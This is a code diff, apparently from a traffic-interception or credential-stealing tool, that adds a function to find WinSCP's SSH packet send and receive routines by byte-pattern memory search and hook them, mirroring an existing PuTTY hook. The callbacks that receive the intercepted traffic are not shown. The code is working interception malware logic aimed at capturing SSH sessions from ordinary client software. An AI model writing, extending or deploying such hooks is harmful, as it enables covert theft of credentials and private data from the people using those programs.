@@ -168,3 +168,41 @@ void HookPutty()
 	Hooker::AddHook((void *)pSend, (void *)PuttySend_Callback);
 	Hooker::AddHook((void *)pRecv, (void *)PuttyRecv_Callback);
 }
+
+// Hook WinSCP
+
+void HookWinSCP()
+{
+	SECTION_INFO text  = {0, 0};
+	unsigned char SEND_string[] = { 0x55, 0x8B, 0xEC, 0x8B, 0x55, 0x0C, 0x8B, 0x45, 0x08, 0x83, 0xB8, 0x2C, 0x01, 0x00, 0x00 };
+	unsigned char RECV_string[] = { 0x55, 0x8B, 0xEC, 0x83, 0xC4, 0xE4, 0x53, 0x56, 0x57, 0x8B, 0x75, 0x10, 0x8B, 0x5D, 0x08 };
+
+	//Get .text section
+
+	text  = Process::GetModuleSection("winscp.exe", ".text");
+
+	if(text.dwSize == 0 || text.dwStartAddress == 0)
+	{
+		DebugLog::Log("[ERROR] Cannot get WinSCP section!");
+		return;
+	}
+
+	// Serach functions
+
+	DWORD pSend = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, 15);
+	DWORD pRecv = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, 15);
+
+	if(pSend == 0 || pRecv == 0)
+	{
+		DebugLog::Log("[ERROR] Cannot get WinSCP functions!");
+		return;
+	}
+
+	// Add hooks
+
+	SSH_Pktsend_Original = (SSH_Pktsend_Typedef)pSend;
+	SSH_Rdpkt_Original = (SSH_Rdpkt_Typedef)pRecv;
+
+	Hooker::AddHook((void *)pSend, (void *)SSH_Pktsend_Callback);
+	Hooker::AddHook((void *)pRecv, (void *)SSH_Rdpkt_Callback);
+}
